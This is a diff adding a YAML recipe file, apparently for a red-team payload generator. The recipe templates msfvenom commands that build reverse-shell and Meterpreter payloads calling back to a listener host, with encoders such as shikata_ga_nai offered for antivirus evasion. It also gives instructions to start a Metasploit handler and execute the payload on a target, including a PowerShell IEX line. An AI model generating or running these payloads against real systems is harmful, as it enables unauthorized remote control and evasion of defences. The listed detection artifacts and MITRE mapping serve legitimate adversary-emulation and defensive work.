@@ -1,0 +1,104 @@
+recipe_type: "command"
+
+name: "Msfvenom Reverse Shell"
+description: |
+  Generates various payload formats using msfvenom from Metasploit Framework.
+  Highly flexible but signatures are well-known to AV/EDR vendors.
+  
+  Medium effectiveness - use encoding/encryption for better evasion.
+
+mitre:
+  tactic: "TA0002 - Execution"
+  technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+
+effectiveness: "medium"
+
+artifacts:
+  - "Metasploit framework signatures in payload"
+  - "Outbound connection to C2 handler"
+  - "Common shellcode patterns detectable by AV"
+  - "Typical msfvenom payload structure"
+  - "Network traffic to LHOST:LPORT"
+
+dependencies:
+  - tool: "msfvenom"
+    check_command: "which msfvenom"
+    install_hint: "Install Metasploit Framework: https://www.metasploit.com/"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Listener IP address"
+    required: true
+    validation: "ipv4"
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port"
+    required: true
+    default: 4444
+
+  - name: "payload_type"
+    type: "choice"
+    description: "Payload type"
+    required: true
+    choices:
+      - "windows/x64/meterpreter_reverse_tcp"
+      - "windows/x64/shell_reverse_tcp"
+      - "windows/meterpreter/reverse_https"
+      - "linux/x64/shell_reverse_tcp"
+      - "linux/x64/meterpreter_reverse_tcp"
+      - "python/meterpreter_reverse_tcp"
+    default: "windows/x64/meterpreter_reverse_tcp"
+
+  - name: "encoder"
+    type: "choice"
+    description: "Encoder for evasion (none for no encoding)"
+    required: false
+    choices: ["none", "x86/shikata_ga_nai", "x64/xor_dynamic", "x64/zutto_dekiru"]
+    default: "none"
+
+  - name: "iterations"
+    type: "integer"
+    description: "Encoding iterations (more = better evasion, larger size)"
+    required: false
+    default: 1
+    range: [1, 10]
+
+  - name: "format"
+    type: "choice"
+    description: "Output format"
+    required: true
+    choices: ["exe", "dll", "raw", "ps1", "python", "csharp", "c"]
+    default: "exe"
+
+  - name: "output_dir"
+    type: "path"
+    description: "Output directory"
+    required: true
+    default: "./output"
+
+generation_command: |
+  msfvenom -p {{ payload_type }} \
+    LHOST={{ lhost }} LPORT={{ lport }} \
+    {% if encoder != 'none' %}-e {{ encoder }} -i {{ iterations }} {% endif %}\
+    -f {{ format }} \
+    -o {{ output_dir }}/{{ output_filename }}
+
+output:
+  type: "file"
+  filename_pattern: "msfvenom_{format}_{timestamp}.{{ format }}"
+
+launch_instructions: |
+  # Start Metasploit handler first:
+  msfconsole -q -x "use exploit/multi/handler; \
+    set payload {{ payload_type }}; \
+    set LHOST {{ lhost }}; \
+    set LPORT {{ lport }}; \
+    set ExitOnSession false; \
+    exploit -j"
+  
+  # Then execute payload on target
+  # Windows: {{ output_filename }}
+  # Linux: chmod +x {{ output_filename }} && ./{{ output_filename }}
+  # PowerShell: IEX(Get-Content {{ output_filename }} -Raw)
